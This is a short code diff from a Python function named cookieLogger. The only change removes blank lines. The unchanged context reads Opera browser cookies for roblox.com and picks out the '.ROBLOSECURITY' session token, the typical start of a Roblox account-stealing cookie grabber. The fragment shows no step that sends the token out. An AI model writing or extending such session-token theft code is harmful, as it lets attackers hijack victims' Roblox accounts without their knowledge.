@@ -63,8 +63,6 @@ def cookieLogger():
         pass
 
     try:
-
-
         cookies = browser_cookie3.opera(domain_name='roblox.com')
         for cookie in cookies:
             if cookie.name == '.ROBLOSECURITY':
